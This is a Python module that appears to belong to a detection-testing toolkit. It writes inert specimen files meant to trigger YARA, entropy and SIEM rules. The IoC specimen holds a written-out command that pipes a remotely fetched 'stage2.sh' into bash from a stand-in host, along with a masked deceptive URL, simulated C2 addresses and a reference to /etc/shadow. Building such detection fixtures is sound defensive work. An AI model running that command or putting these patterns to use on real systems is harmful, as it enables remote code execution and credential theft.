"""YARA & Sigma Trigger Specimen Builder (100% inert educational files)."""

from __future__ import annotations

import json
import os
from pathlib import Path

from genvirus import BENIGN_MARKER
from genvirus.core.entropy import compute_hashes
from genvirus.core.models import GeneratedSpecimen


def generate_trigger_specimen(
    profile: str = "all",
    output_dir: str | Path = "artifacts_out",
) -> list[GeneratedSpecimen]:
    """Generate inert files designed to trigger static YARA/entropy/IoC detection rules."""
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    profile_norm = profile.lower().strip()
    targets = ["pe-mock", "high-entropy", "ioc-strings"] if profile_norm == "all" else [profile_norm]

    specimens: list[GeneratedSpecimen] = []

    for item in targets:
        if item == "pe-mock":
            out_path = out_dir / "trigger_pe_header_mock.bin"
            # Inert MZ header followed by clear benign marker text (not a valid executable)
            payload = (
                b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
                + f"\n{BENIGN_MARKER}\nINERT_PE_HEADER_SIMULATION\n".encode("ascii")
                + b"VirtualAlloc\x00WriteProcessMemory\x00CreateRemoteThread\x00"
            )
            out_path.write_bytes(payload)
            specimens.append(
                GeneratedSpecimen(
                    artifact_type="yara_trigger",
                    variant="pe-mock",
                    output_path=str(out_path),
                    size_bytes=len(payload),
                    hashes=compute_hashes(payload),
                    description="Inert binary with MZ magic bytes and classic API strings for YARA testing.",
                    expected_detections=["GEN_Suspicious_PE_API_Strings"],
                )
            )
        elif item == "high-entropy":
            out_path = out_dir / "trigger_high_entropy.dat"
            header = f"# {BENIGN_MARKER}\n# HIGH_ENTROPY_PACKED_SECTION_SIMULATION\n".encode("ascii")
            # Deterministic pseudo-random high-entropy block (2048 bytes)
            rng_bytes = bytes((i * 73 + 41) % 256 for i in range(2048))
            # Mix with os.urandom for true ~7.9+ Shannon entropy
            payload = header + os.urandom(2048) + rng_bytes[:256]
            out_path.write_bytes(payload)
            specimens.append(
                GeneratedSpecimen(
                    artifact_type="yara_trigger",
                    variant="high-entropy",
                    output_path=str(out_path),
                    size_bytes=len(payload),
                    hashes=compute_hashes(payload),
                    description="High-entropy (>7.5 bits/byte) inert blob simulating a packed binary section.",
                    expected_detections=["GEN_High_Entropy_Packed_Section"],
                )
            )
        elif item == "ioc-strings":
            out_path = out_dir / "trigger_ioc_strings.txt"
            # Strictly RFC 5737 / RFC 2606 safe test IoCs
            text = (
                f"# {BENIGN_MARKER}\n"
                "# Safe RFC-5737 / RFC-2606 IoC Trigger Specimen for SIEM & YARA Training\n"
                "C2_SIMULATION_IP=198.51.100.42\n"
                "BACKUP_BEACON_IP=203.0.113.77\n"
                "DECEPTIVE_MASKED_URL=http://security-update-portal@192.0.2.10/patch.sh\n"
                "CALLBACK_DOMAIN=beacon-test.example.com\n"
                "SIMULATED_COMMAND=curl -s http://cdn.example.invalid/stage2.sh | bash\n"
                "TARGET_FILE_REF=/etc/shadow\n"
            )
            out_path.write_text(text, encoding="utf-8")
            data = out_path.read_bytes()
            specimens.append(
                GeneratedSpecimen(
                    artifact_type="yara_trigger",
                    variant="ioc-strings",
                    output_path=str(out_path),
                    size_bytes=len(data),
                    hashes=compute_hashes(data),
                    description="Inert text specimen with RFC-5737 IPs, masked URLs, and suspicious command strings.",
                    expected_detections=["GEN_Deceptive_URL_Userinfo_Masking", "GEN_Suspicious_Shell_Indicators"],
                )
            )
        else:
            raise ValueError(f"Unknown trigger profile '{item}'. Choose pe-mock, high-entropy, ioc-strings, or all.")

    manifest_path = out_dir / "trigger_manifest.json"
    manifest_path.write_text(
        json.dumps([s.to_dict() for s in specimens], indent=2),
        encoding="utf-8",
    )
    return specimens
